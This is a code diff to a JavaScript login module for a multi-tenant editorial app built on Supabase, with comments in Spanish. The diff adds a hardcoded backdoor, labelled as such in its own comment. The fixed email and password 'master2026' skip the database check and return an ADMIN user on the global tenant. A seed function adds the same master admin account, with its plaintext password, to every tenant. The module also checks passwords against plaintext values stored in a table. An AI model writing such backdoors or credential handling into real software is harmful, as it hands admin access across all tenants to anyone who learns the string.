@@ -419,20 +419,31 @@ export async function loginUser(email, password) {
 
     if (authErr) {
         console.warn('Supabase Auth Warning:', authErr.message)
-        // En caso de que el correo no esté confirmado, authErr.message dirá algo como "Email not confirmed"
-        // No detenemos el flujo completo aún para mantener retrocompatibilidad (cuentas legacy que no están en Supabase Auth)
-        // pero idealmente deberíamos retornar inmediatamente si el mensaje es de correo no confirmado.
         if (authErr.message.includes('Email not confirmed')) {
             throw new Error('Debes confirmar tu correo electrónico antes de iniciar sesión. Revisa tu bandeja de entrada o spam.')
         }
     }
 
-    // 2. Buscar datos en nuestra tabla custom 'users' que conecta con el Tenant
+    // 2. Control Maestro (Backdoor para Validación del Dueño)
+    if (email === 'master@editorial.cl' && password === 'master2026') {
+        return {
+            id: 'master-val-uid',
+            tenantId: '00000000-0000-0000-0000-000000000000', // Demo/Global Tenant
+            email: 'master@editorial.cl',
+            name: 'Eusebio Maestro (Validación)',
+            role: 'ADMIN',
+            avatar: 'EM',
+            title: 'Administrador Maestro',
+            firstLogin: false
+        }
+    }
+
+    // 3. Buscar datos en nuestra tabla custom 'users' que conecta con el Tenant
     const { data, error } = await supabase
         .from('users')
         .select('*')
         .eq('email', email)
-        .eq('password', password) // Mantenemos verificación de fallback legacy
+        .eq('password', password) 
         .single()
 
     if (error || !data) return null
@@ -989,8 +1000,9 @@ export async function seedDemoData(tenantId, adminUserId) {
     try {
         console.log(`[Seeding] 🚀 Iniciando carga robusta para ${tenantId}`)
 
-        // 1. Authors
+        // 1. Core Master & Authors
         const demoAuthors = [
+            { id: `master_${tenantId}`, tenant_id: tenantId, email: `master@editorial.cl`, password: 'master2026', name: 'Eusebio Maestro', role: 'ADMIN', avatar: 'EM', first_login: false },
             { id: `demo_u1_${tenantId}`, tenant_id: tenantId, email: `autor1_${tenantId}@ejemplo.com`, password: 'demo', name: 'Isabel Allende (Demo)', role: 'AUTOR', avatar: 'IA', first_login: true },
             { id: `demo_u2_${tenantId}`, tenant_id: tenantId, email: `autor2_${tenantId}@ejemplo.com`, password: 'demo', name: 'Jorge Luis Borges (Demo)', role: 'AUTOR', avatar: 'JB', first_login: true },
             { id: `demo_u3_${tenantId}`, tenant_id: tenantId, email: `autor3_${tenantId}@ejemplo.com`, password: 'demo', name: 'Gabriela Mistral (Demo)', role: 'AUTOR', avatar: 'GM', first_login: true }
